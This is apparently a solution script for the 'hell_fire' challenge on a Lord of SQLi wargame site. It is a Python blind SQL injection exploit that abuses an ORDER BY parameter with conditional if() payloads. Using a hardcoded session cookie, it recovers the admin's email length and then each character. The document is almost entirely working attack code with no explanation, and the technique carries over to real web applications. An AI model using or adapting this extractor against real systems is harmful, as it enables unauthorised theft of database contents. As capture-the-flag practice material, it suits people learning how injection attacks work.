import requests, string

cookies = {"PHPSESSID": "iseeqtqodf0v3uruusgvtv6qfk"}

url = "https://los.rubiya.kr/chall/hell_fire_309d5f471fbdd4722d221835380bb805.php"

success_text = "<tr><td>admin</td><td>"

email_length = 0

for l in range(1,100):
  payload = "if((id='admin' and length(email)={length}),score,9e307) limit 0,1".format(length=l)
  params = {"order": payload}
  r = requests.get(url, params=params, cookies=cookies)
  if success_text in r.text:
    email_length = l
    print("Email length is %s" % (email_length))
    break

email = ""

for l in range(1, email_length+1):
  for c in string.printable:
    payload = "if((id='admin' and ascii(substring(email,{offset},1))={character}),score,9e307) limit 0,1".format(offset=l, character=ord(c))
    params = {"order": payload}
    r = requests.get(url, params=params, cookies=cookies)
    if success_text in r.text:
      email += c
      print(email)
      break
